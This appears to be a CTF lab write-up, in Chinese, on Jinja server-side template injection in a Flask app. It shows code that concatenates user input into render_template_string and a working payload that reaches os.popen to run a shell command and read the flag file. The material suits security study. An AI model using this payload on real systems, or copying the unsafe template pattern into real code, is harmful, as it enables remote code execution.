# LAB -  Jinja SSTI
###### tags: `資安` `Web`

## 題目解析
題目連進來可以看到輸入框跟 source code。

![](https://i.imgur.com/ZtEV4eu.png)

這是一個 flask 框架，source code 比較重點的部分就是會把我們輸入框的 name 內容直接 render 上 HTML
```python=
@app.get("/")
def home():
    return render_template_string("""
    <form method="POST">
        <input type="text" name="name" placeholder="Your name">
        <button>submit</button>
    </form>
    <p><a href="/source">Source code</a></p>
    """)
    
@app.post("/")
def welcome_message():
    name = request.form.get('name')
    return render_template_string("<p>Hello, " + name + "</p>")
```

## 解題流程

我們可以想辦法利用 python 的一些 magic function 逐步找到 os 模組，找到 os 模組就可以用 popen() 來開啟指令的 process 執行，再透過read() 就能把輸出讀回來。

```
{{().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cd /; cat th1s_15_fl4ggggggg').read()}}
```
## FLAG 截圖
![](https://i.imgur.com/Y1K3pFT.png)
